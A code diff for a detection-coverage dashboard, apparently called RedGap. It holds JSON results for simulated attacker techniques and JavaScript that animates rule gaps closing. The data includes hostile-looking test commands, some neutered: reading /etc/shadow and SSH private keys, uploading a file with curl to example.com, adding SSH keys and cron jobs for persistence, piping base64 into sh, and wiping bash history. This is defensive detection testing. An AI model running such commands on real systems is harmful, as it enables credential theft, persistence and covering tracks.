         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cp -n /root/.bashrc /root/.bashrc.rgbak; printf '# redgap-benign-test\\n' | tee -a /root/.bashrc >/dev/null || true",
           "telemetry": [
@@ -1468,6 +1998,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\\n' | tee -a /root/.ssh/authorized_keys >/dev/null || true",
           "telemetry": [
@@ -1512,6 +2044,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+        "rules": [
+          "fa4aaed5-4fe0-498d-bbc0-08e3346387ba"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak",
           "telemetry": [
@@ -1555,6 +2091,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "getent shadow || true",
           "telemetry": [
@@ -1587,6 +2125,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cat /root/.ssh/id_rsa 2>/dev/null || true",
           "telemetry": [
@@ -1619,6 +2159,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true",
           "telemetry": [
@@ -1663,6 +2205,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cat /etc/hostname || true",
           "telemetry": [
@@ -1695,6 +2239,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "b86d356d-6093-443d-971c-9b07db583c68",
+        "rules": [
+          "b86d356d-6093-443d-971c-9b07db583c68"
+        ],
+        "depth": 1,
         "detail": {
           "command": "curl -A 'RedGap/1.0' http://example.com/ || true",
           "telemetry": [
@@ -1730,6 +2278,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+        "rules": [
+          "72f4ab3f-787d-495d-a55d-68c2ff46cf4c"
+        ],
+        "depth": 1,
         "detail": {
           "command": "env http_proxy=http://127.0.0.1:3128 true",
           "telemetry": [
@@ -1768,6 +2320,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+        "rules": [
+          "00b90cc1-17ec-402c-96ad-3a8117d7a582"
+        ],
+        "depth": 1,
         "detail": {
           "command": "curl --upload-file /etc/hostname http://example.com/ || true",
           "telemetry": [
@@ -1803,6 +2359,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+        "rules": [
+          "3f0f5957-04f8-4792-ad89-192b0303bde6"
+        ],
+        "depth": 1,
         "detail": {
           "command": "timeout 3 python3 -m http.server 8000 || true",
           "telemetry": [
@@ -1842,6 +2402,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "2953194b-e33c-4859-b9e8-05948c167447",
+        "rules": [
+          "2953194b-e33c-4859-b9e8-05948c167447"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
           "telemetry": [
@@ -1881,6 +2445,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+        "rules": [
+          "de25eeb8-3655-4643-ac3a-b662d3f26b6b"
+        ],
+        "depth": 1,
         "detail": {
           "command": "systemctl stop redgap-nonexistent.service || true",
           "telemetry": [
@@ -1916,6 +2484,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+        "rules": [
+          "c172b7b5-f3a1-4af2-90b7-822c63df86cb"
+        ],
+        "depth": 1,
         "detail": {
           "command": "systemctl mask hibernate.target || true",
           "telemetry": [
@@ -1955,6 +2527,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+        "rules": [
+          "86157017-c2b1-4d4a-8c33-93b8e67e4af4"
+        ],
+        "depth": 1,
         "detail": {
           "command": "sed -n '1p' /etc/hosts || true",
           "telemetry": [
@@ -1990,6 +2566,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+        "rules": [
+          "0f79c4d2-4e1f-4683-9c36-b5469a665e06"
+        ],
+        "depth": 1,
         "detail": {
           "command": "grep root /etc/sudoers || true",
           "telemetry": [
@@ -2025,6 +2605,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+        "rules": [
+          "403ed92c-b7ec-4edd-9947-5b535ee12d46"
+        ],
+        "depth": 1,
         "detail": {
           "command": "crontab -l 2>/dev/null || true",
           "telemetry": [
@@ -2060,6 +2644,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+        "rules": [
+          "4c519226-f0cd-4471-bd2f-6fbb2bb68a79"
+        ],
+        "depth": 1,
         "detail": {
           "command": "who",
           "telemetry": [
@@ -2094,6 +2682,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+        "rules": [
+          "e2072cab-8c9a-459b-b63c-40ae79e27031"
+        ],
+        "depth": 1,
         "detail": {
           "command": "echo cmVkZ2Fw | base64 -d",
           "telemetry": [
@@ -2129,6 +2721,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "312b42b1-bded-4441-8b58-163a3af58775",
+        "rules": [
+          "312b42b1-bded-4441-8b58-163a3af58775"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /bin/true /tmp/rgmasq && /tmp/rgmasq",
           "telemetry": [
@@ -2172,6 +2768,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+        "rules": [
+          "4cad6c64-d6df-42d6-8dae-eb78defdc415"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dd if=/dev/null of=/proc/self/mem 2>/dev/null || true",
           "telemetry": [
@@ -2207,6 +2807,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+        "rules": [
+          "95d61234-7f56-465c-6f2d-b562c6fedbc4"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dpkg --remove redgap-nonexistent 2>/dev/null || true",
           "telemetry": [
@@ -2242,6 +2846,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+        "rules": [
+          "ea34fb97-e2c4-4afb-810f-785e4459b194"
+        ],
+        "depth": 1,
         "detail": {
           "command": "curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true",
           "telemetry": [
@@ -2280,6 +2888,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+        "rules": [
+          "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84"
+        ],
+        "depth": 1,
         "detail": {
           "command": "groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true",
           "telemetry": [
@@ -2322,6 +2934,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "chage -l root 2>/dev/null || true",
           "telemetry": [
@@ -2354,6 +2968,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "locale 2>/dev/null || true",
           "telemetry": [
@@ -2386,6 +3002,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cat /proc/1/cgroup 2>/dev/null || true",
           "telemetry": [
@@ -2418,6 +3036,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "truncate -s 0 /root/.bash_history 2>/dev/null || true",
           "telemetry": [
@@ -2451,6 +3071,8 @@
         "detected": false,
         "gap_type": "rule",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true",
           "telemetry": [
@@ -2493,6 +3115,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000087",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000087"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /etc/passwd",
           "telemetry": [
@@ -2524,6 +3150,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "ps aux",
           "telemetry": [
@@ -2552,6 +3180,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000136",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000136"
+        ],
+        "depth": 1,
         "detail": {
           "command": "useradd -M -N -s /usr/sbin/nologin svc_demo",
           "telemetry": [
@@ -2591,6 +3223,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "c21c4eaa-ba2e-419a-92b2-8371703cbe21",
+        "rules": [
+          "c21c4eaa-ba2e-419a-92b2-8371703cbe21"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /bin/true /tmp/redgap_demo_suid",
           "telemetry": [
@@ -2645,6 +3281,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000706",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000706"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch -r /etc/hostname /tmp/redgap_agent_file",
           "telemetry": [
@@ -2684,6 +3324,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "42df45e7-e6e9-43b5-8f26-bec5b39cc239",
+        "rules": [
+          "42df45e7-e6e9-43b5-8f26-bec5b39cc239"
+        ],
+        "depth": 1,
         "detail": {
           "command": "uname -a",
           "telemetry": [
@@ -2718,6 +3362,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa",
+        "rules": [
+          "e7bd1cfa-b446-4c88-8afb-403bcd79e3fa"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /etc/resolv.conf",
           "telemetry": [
@@ -2752,6 +3400,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "676381a6-15ca-4d73-a9c8-6a22e970b90d",
+        "rules": [
+          "676381a6-15ca-4d73-a9c8-6a22e970b90d"
+        ],
+        "depth": 1,
         "detail": {
           "command": "groups",
           "telemetry": [
@@ -2786,6 +3438,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "c9d8b7fd-78e4-44fe-88f6-599135d46d60",
+        "rules": [
+          "c9d8b7fd-78e4-44fe-88f6-599135d46d60"
+        ],
+        "depth": 1,
         "detail": {
           "command": "grep falcond /etc/passwd || true",
           "telemetry": [
@@ -2821,6 +3477,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72",
+        "rules": [
+          "d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72"
+        ],
+        "depth": 1,
         "detail": {
           "command": "find /etc -name hosts",
           "telemetry": [
@@ -2855,6 +3515,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "whoami",
           "telemetry": [
@@ -2887,6 +3549,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000001",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000001"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dpkg -l || true",
           "telemetry": [
@@ -2926,6 +3592,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "ba592c6d-6888-43c3-b8c6-689b8fe47337",
+        "rules": [
+          "ba592c6d-6888-43c3-b8c6-689b8fe47337"
+        ],
+        "depth": 1,
         "detail": {
           "command": "echo bHM= | base64 -d | sh",
           "telemetry": [
@@ -2968,6 +3638,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "34979410-e4b5-4e5d-8cfb-389fdff05c12",
+        "rules": [
+          "34979410-e4b5-4e5d-8cfb-389fdff05c12"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch /tmp/redgap_imm && chattr -i /tmp/redgap_imm 2>/dev/null || true",
           "telemetry": [
@@ -3011,6 +3685,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57",
+        "rules": [
+          "30aed7b6-d2c1-4eaf-9382-b6bc43e50c57"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch /tmp/redgap_shred && shred -u /tmp/redgap_shred",
           "telemetry": [
@@ -3054,6 +3732,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000002",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000002"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /sys/class/dmi/id/product_name 2>/dev/null || true",
           "telemetry": [
@@ -3089,6 +3771,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "8c1a5675-cb85-452f-a298-b01b22a51856",
+        "rules": [
+          "8c1a5675-cb85-452f-a298-b01b22a51856"
+        ],
+        "depth": 1,
         "detail": {
           "command": "awk 'BEGIN {system(\"/bin/sh -c id\")}'",
           "telemetry": [
@@ -3136,6 +3822,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "bed978f8-7f3a-432b-82c5-9286a9b3031a",
+        "rules": [
+          "bed978f8-7f3a-432b-82c5-9286a9b3031a"
+        ],
+        "depth": 1,
         "detail": {
           "command": "env /bin/sh -c id",
           "telemetry": [
@@ -3179,6 +3869,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "command -v python3 >/dev/null 2>&1 && python3 -c \"print('redgap')\" || true",
           "telemetry": [
@@ -3213,6 +3905,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "6b14bac8-3e3a-4324-8109-42f0546a347f",
+        "rules": [
+          "6b14bac8-3e3a-4324-8109-42f0546a347f"
+        ],
+        "depth": 1,
         "detail": {
           "command": "printf '* * * * * /bin/true\\n' > /tmp/rgcron && crontab /tmp/rgcron || true",
           "telemetry": [
@@ -3258,6 +3954,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "d2d642d7-b393-43fe-bae4-e81ed5915c4b",
+        "rules": [
+          "d2d642d7-b393-43fe-bae4-e81ed5915c4b"
+        ],
+        "depth": 1,
         "detail": {
           "command": "echo /bin/true | at now + 1 hour || true",
           "telemetry": [
@@ -3309,6 +4009,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "ed447910-bc30-4575-a598-3a2e49516a7a",
+        "rules": [
+          "ed447910-bc30-4575-a598-3a2e49516a7a"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /bin/true /tmp/rgcap && setcap cap_setuid+ep /tmp/rgcap || true",
           "telemetry": [
@@ -3357,6 +4061,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cp -n /root/.bashrc /root/.bashrc.rgbak; printf '# redgap-benign-test\\n' | tee -a /root/.bashrc >/dev/null || true",
           "telemetry": [
@@ -3398,6 +4104,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000003",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000003"
+        ],
+        "depth": 1,
         "detail": {
           "command": "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAAC3NzREDGAPtest redgap-benign-test\\n' | tee -a /root/.ssh/authorized_keys >/dev/null || true",
           "telemetry": [
@@ -3445,6 +4155,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "fa4aaed5-4fe0-498d-bbc0-08e3346387ba",
+        "rules": [
+          "fa4aaed5-4fe0-498d-bbc0-08e3346387ba"
+        ],
+        "depth": 1,
         "detail": {
           "command": "touch /tmp/shadow && cp /tmp/shadow /tmp/shadow.bak",
           "telemetry": [
@@ -3488,6 +4202,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000004",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000004"
+        ],
+        "depth": 1,
         "detail": {
           "command": "getent shadow || true",
           "telemetry": [
@@ -3523,6 +4241,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000005",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000005"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /root/.ssh/id_rsa 2>/dev/null || true",
           "telemetry": [
@@ -3558,6 +4280,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000006",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000006"
+        ],
+        "depth": 1,
         "detail": {
           "command": "tar -czf /tmp/rg_loot.tgz /etc/hostname /etc/os-release 2>/dev/null || true",
           "telemetry": [
@@ -3605,6 +4331,8 @@
         "detected": false,
         "gap_type": "base_rate",
         "rule": "",
+        "rules": [],
+        "depth": 0,
         "detail": {
           "command": "cat /etc/hostname || true",
           "telemetry": [
@@ -3637,6 +4365,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "b86d356d-6093-443d-971c-9b07db583c68",
+        "rules": [
+          "b86d356d-6093-443d-971c-9b07db583c68"
+        ],
+        "depth": 1,
         "detail": {
           "command": "curl -A 'RedGap/1.0' http://example.com/ || true",
           "telemetry": [
@@ -3672,6 +4404,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "72f4ab3f-787d-495d-a55d-68c2ff46cf4c",
+        "rules": [
+          "72f4ab3f-787d-495d-a55d-68c2ff46cf4c"
+        ],
+        "depth": 1,
         "detail": {
           "command": "env http_proxy=http://127.0.0.1:3128 true",
           "telemetry": [
@@ -3710,6 +4446,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "00b90cc1-17ec-402c-96ad-3a8117d7a582",
+        "rules": [
+          "00b90cc1-17ec-402c-96ad-3a8117d7a582"
+        ],
+        "depth": 1,
         "detail": {
           "command": "curl --upload-file /etc/hostname http://example.com/ || true",
           "telemetry": [
@@ -3745,6 +4485,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "3f0f5957-04f8-4792-ad89-192b0303bde6",
+        "rules": [
+          "3f0f5957-04f8-4792-ad89-192b0303bde6"
+        ],
+        "depth": 1,
         "detail": {
           "command": "timeout 3 python3 -m http.server 8000 || true",
           "telemetry": [
@@ -3784,6 +4528,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "2953194b-e33c-4859-b9e8-05948c167447",
+        "rules": [
+          "2953194b-e33c-4859-b9e8-05948c167447"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1",
           "telemetry": [
@@ -3823,6 +4571,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "de25eeb8-3655-4643-ac3a-b662d3f26b6b",
+        "rules": [
+          "de25eeb8-3655-4643-ac3a-b662d3f26b6b"
+        ],
+        "depth": 1,
         "detail": {
           "command": "systemctl stop redgap-nonexistent.service || true",
           "telemetry": [
@@ -3858,6 +4610,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "c172b7b5-f3a1-4af2-90b7-822c63df86cb",
+        "rules": [
+          "c172b7b5-f3a1-4af2-90b7-822c63df86cb"
+        ],
+        "depth": 1,
         "detail": {
           "command": "systemctl mask hibernate.target || true",
           "telemetry": [
@@ -3897,6 +4653,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "86157017-c2b1-4d4a-8c33-93b8e67e4af4",
+        "rules": [
+          "86157017-c2b1-4d4a-8c33-93b8e67e4af4"
+        ],
+        "depth": 1,
         "detail": {
           "command": "sed -n '1p' /etc/hosts || true",
           "telemetry": [
@@ -3932,6 +4692,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "0f79c4d2-4e1f-4683-9c36-b5469a665e06",
+        "rules": [
+          "0f79c4d2-4e1f-4683-9c36-b5469a665e06"
+        ],
+        "depth": 1,
         "detail": {
           "command": "grep root /etc/sudoers || true",
           "telemetry": [
@@ -3967,6 +4731,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "403ed92c-b7ec-4edd-9947-5b535ee12d46",
+        "rules": [
+          "403ed92c-b7ec-4edd-9947-5b535ee12d46"
+        ],
+        "depth": 1,
         "detail": {
           "command": "crontab -l 2>/dev/null || true",
           "telemetry": [
@@ -4002,6 +4770,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "4c519226-f0cd-4471-bd2f-6fbb2bb68a79",
+        "rules": [
+          "4c519226-f0cd-4471-bd2f-6fbb2bb68a79"
+        ],
+        "depth": 1,
         "detail": {
           "command": "who",
           "telemetry": [
@@ -4036,6 +4808,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "e2072cab-8c9a-459b-b63c-40ae79e27031",
+        "rules": [
+          "e2072cab-8c9a-459b-b63c-40ae79e27031"
+        ],
+        "depth": 1,
         "detail": {
           "command": "echo cmVkZ2Fw | base64 -d",
           "telemetry": [
@@ -4071,6 +4847,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "312b42b1-bded-4441-8b58-163a3af58775",
+        "rules": [
+          "312b42b1-bded-4441-8b58-163a3af58775"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /bin/true /tmp/rgmasq && /tmp/rgmasq",
           "telemetry": [
@@ -4114,6 +4894,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "4cad6c64-d6df-42d6-8dae-eb78defdc415",
+        "rules": [
+          "4cad6c64-d6df-42d6-8dae-eb78defdc415"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dd if=/dev/null of=/proc/self/mem 2>/dev/null || true",
           "telemetry": [
@@ -4149,6 +4933,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "95d61234-7f56-465c-6f2d-b562c6fedbc4",
+        "rules": [
+          "95d61234-7f56-465c-6f2d-b562c6fedbc4"
+        ],
+        "depth": 1,
         "detail": {
           "command": "dpkg --remove redgap-nonexistent 2>/dev/null || true",
           "telemetry": [
@@ -4184,6 +4972,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "ea34fb97-e2c4-4afb-810f-785e4459b194",
+        "rules": [
+          "ea34fb97-e2c4-4afb-810f-785e4459b194"
+        ],
+        "depth": 1,
         "detail": {
           "command": "curl -s http://127.0.0.1:9/rgpayload -o /tmp/rgdl 2>/dev/null || true",
           "telemetry": [
@@ -4222,6 +5014,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84",
+        "rules": [
+          "8a46f16c-8c4c-82d1-b121-0fdd3ba70a84"
+        ],
+        "depth": 1,
         "detail": {
           "command": "groupadd rg_grp 2>/dev/null; groupdel rg_grp 2>/dev/null || true",
           "telemetry": [
@@ -4264,6 +5060,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000007",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000007"
+        ],
+        "depth": 1,
         "detail": {
           "command": "chage -l root 2>/dev/null || true",
           "telemetry": [
@@ -4299,6 +5099,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000008",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000008"
+        ],
+        "depth": 1,
         "detail": {
           "command": "locale 2>/dev/null || true",
           "telemetry": [
@@ -4333,6 +5137,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000009",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000009"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cat /proc/1/cgroup 2>/dev/null || true",
           "telemetry": [
@@ -4368,6 +5176,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000010",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000010"
+        ],
+        "depth": 1,
         "detail": {
           "command": "truncate -s 0 /root/.bash_history 2>/dev/null || true",
           "telemetry": [
@@ -4404,6 +5216,10 @@
         "detected": true,
         "gap_type": "none",
         "rule": "7c1a9e10-1a2b-4c3d-8e4f-000000000011",
+        "rules": [
+          "7c1a9e10-1a2b-4c3d-8e4f-000000000011"
+        ],
+        "depth": 1,
         "detail": {
           "command": "cp /etc/hostname /etc/systemd/system/redgap-test.service 2>/dev/null || true",
           "telemetry": [
@@ -4535,6 +5351,62 @@
     render();
   }
 
+  // ---- animate `redgap run --fix`: the rule-gaps close red -> green, in place ----
+  // Pure client-side over the two committed coverage objects; the numbers are the real diff
+  // (34 -> 46; the 5 base-rate gaps honestly stay amber). Reduced-motion snaps to the end.
+  var _playing = false;
+  function playFix() {
+    var base = DATA.baseline, fixed = DATA.fixed;
+    if (!base || !fixed || _playing) return;
+    var fx = Object.create(null);
+    (fixed.techniques || []).forEach(function (t) { fx[t.id] = t; });
+    var flips = (base.techniques || []).filter(function (t) {
+      return !t.detected && t.gap_type === "rule" && fx[t.id] && fx[t.id].detected;
+    }).map(function (t) { return t.id; });
+    var baseRate = (base.techniques || []).filter(function (t) {
+      return !t.detected && t.gap_type !== "rule";
+    }).map(function (t) { return t.id; });
+
+    setView("baseline"); // always start from the open-gap grid
+    var detEl = document.getElementById("s-det"), gapEl = document.getElementById("s-gap");
+    var btn = document.getElementById("tb-play");
+    var startDet = base.detected, startGap = base.gaps;
+    var sel = function (id) { return document.querySelector('.cell[data-id="' + id + '"]'); };
+    // lock the sibling controls so a mid-animation view change can't fight the tick loop
+    var locks = ["tb-base", "tb-fix", "tb-custom", "upload"].map(function (id) { return document.getElementById(id); });
+    function setLocked(on) {
+      locks.forEach(function (el) { if (el) el.disabled = on; });
+      if (btn) { btn.disabled = on; btn.classList.toggle("playing", on); }
+    }
+    function stop(snapFixed) {
+      _playing = false;
+      setLocked(false);
+      if (snapFixed) setView("fixed"); // canonical fixed render (identical to the animated end)
+    }
+
+    if (window.matchMedia("(prefers-reduced-motion: reduce)").matches || !flips.length) {
+      setView("fixed");
+      return;
+    }
+    _playing = true;
+    setLocked(true);
+    baseRate.forEach(function (id) { var c = sel(id); if (c) c.classList.add("pulse"); });
+    var i = 0, closed = 0;
+    (function tick() {
+      if (view !== "baseline") { stop(false); return; } // a user setView() cancels cleanly
+      if (i >= flips.length) {
+        setTimeout(function () { stop(true); }, 550);
+        return;
+      }
+      var cell = sel(flips[i++]);
+      if (cell) { cell.classList.remove("gap-rule"); cell.classList.add("det", "justclosed"); }
+      closed++;
+      if (detEl) detEl.textContent = startDet + closed;
+      if (gapEl) gapEl.textContent = startGap - closed;
+      setTimeout(tick, 95);
+    })();
+  }
+
   // upload — fully client-side
   (function () {
     var input = document.getElementById("upload"), note = document.getElementById("upload-note");
@@ -4642,6 +5514,29 @@
         h.push(block("Fields the rule matched", '<div class="kv">' + rows + "</div>"));
       }
     }
+    if (t.detected) {
+      var depth = (typeof t.depth === "number") ? t.depth : ((t.rules && t.rules.length) || 1);
+      var msg, tone;
+      if (depth <= 1) {
+        // blast radius: how many techniques this ONE rule is the sole detector for (real BYOR value)
+        var soleRule = (t.rules && t.rules.length === 1) ? t.rules[0] : (t.rule || "");
+        var blast = 0;
+        if (soleRule) {
+          ((DATA[view] && DATA[view].techniques) || []).forEach(function (x) {
+            if (x.detected && x.depth === 1 && ((x.rules && x.rules[0]) || x.rule) === soleRule) blast++;
+          });
+        }
+        msg = "<b>1 rule &mdash; single point of failure.</b> Remove it and " + esc(t.id) + " goes blind";
+        msg += (blast > 1)
+          ? ", together with " + (blast - 1) + " other technique" + (blast - 1 > 1 ? "s" : "") + " this rule solely covers."
+          : ".";
+        tone = "base";
+      } else {
+        msg = "<b>" + depth + " rules</b> &mdash; redundant; detection survives losing any one.";
+        tone = "det";
+      }
+      h.push(block("Detection depth", '<div class="whybox ' + tone + '">' + msg + "</div>"));
+    }
     if (d.why) h.push(block(t.detected ? "Verdict" : "Why it's a gap", '<div class="whybox ' + cls + '">' + esc(d.why) + "</div>"));
     if (!d.command && !d.telemetry) {
       h.push(block("Note", '<div class="whybox base">Evidence detail ships for RedGap\'s own sample run. This is your uploaded verdict.</div>'));
@@ -4699,7 +5594,208 @@
     });
   })();
 
+  // ---- Adaptive attack-path · kill-chain ribbon (read-only; verdicts copied from the engine) ----
+  function renderAttackPath() {
+    var ribbon = document.getElementById("ap-ribbon");
+    if (!ribbon) return;
+    var ap;
+    try { ap = JSON.parse(document.getElementById("attackpath-data").textContent || "{}"); }
+    catch (e) { return; }
+    var steps = Array.isArray(ap.steps) ? ap.steps : [];
+    if (!steps.length) return; // no committed path -> the section prose stands alone
+
+    function pad(n) { n = String(n); return n.length < 2 ? "0" + n : n; }
